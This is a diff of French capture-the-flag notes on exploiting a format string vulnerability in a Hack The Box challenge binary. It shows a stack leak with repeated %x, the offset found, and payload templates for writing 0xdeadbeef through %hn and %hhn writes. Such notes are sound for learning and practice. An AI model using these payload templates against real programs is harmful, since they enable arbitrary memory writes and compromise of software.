@@ -24,14 +24,41 @@ for i in range(len(l)):
 
 ### Déterminer le n
 
+On a dans le code d'une part:
+
+![fmt](./fmt.png)
+
+
+D'autre part:
+
 ```bash
-./format $(python -c 'print"AAAA"+"%x"*n') #repérer 0x41414141
+The D-LuLu face identification robot will scan you shortly!
+
+Try to deceive it by changing your ID.
+
+>> 
+[!] Checking.. eb31dbb0.0.96714887.10.7fffffff.1337babe.eb31fcd0.252e7825.2e78252e.78252e78.
+[-] ALERT ALERT ALERT ALERT
+
+┌─[night@night-20b7s2ex01]─[~/htb/pwn/delulu]
+└──╼ 5 fichiers, 36Kb)─$ python -c "print('%x.'*20)" | ./delulu 
 ```
+
+- repérer le check visuellement dans la pile: **ici l'offset est de 6**
+
+- obtenir l'addresse du check: **ici le code est bien fait: var40=&var38 est stockée juste après donc le $n=7**
+
 
 ### Exploit
 
 0xdeadbeef = 0xdead (high) "+" 0xbeef (low)
 
-[endian(adresse écriture low) + endian(addresse écriture high = low +2)]
+- [hexa à écrire]%x [n contrôlé]%n
+
+**ou**
+
+- [endian(adresse écriture low) + endian(addresse écriture high = low +2)]
 %[hexa low à écrire - 8]x%[n contrôlé]$hn%[hexa abs((low-8)-(high-8)) à écrire]x%[n+1] $hn"')
 
+
+**ou** en 4 avec %hhn ...
